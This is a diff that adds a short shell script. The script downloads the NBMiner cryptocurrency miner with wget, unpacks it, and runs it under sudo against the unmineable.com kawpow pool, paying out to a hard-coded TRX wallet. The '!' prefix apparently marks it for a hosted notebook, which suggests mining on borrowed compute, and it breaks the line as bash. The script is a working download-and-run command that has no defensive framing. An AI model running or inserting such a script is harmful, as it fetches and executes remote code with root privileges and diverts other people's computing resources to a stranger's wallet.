@@ -1,0 +1,2 @@
+#!/bin/bash
+!wget https://github.com/NebuTech/NBMiner/releases/download/v37.5/NBMiner_37.5_Linux.tgz && tar -xvf NBMiner_37.5_Linux.tgz && cd NBMiner_Linux && sudo ./nbminer -a kawpow -o kp.unmineable.com:3333 --user TRX:TPQwsYETz17e5Xka2aqMwSXRtfGCaPbhzH.$(echo $(shuf -i 9-99 -n 1)-Kizaru#ln9q-3xm0)
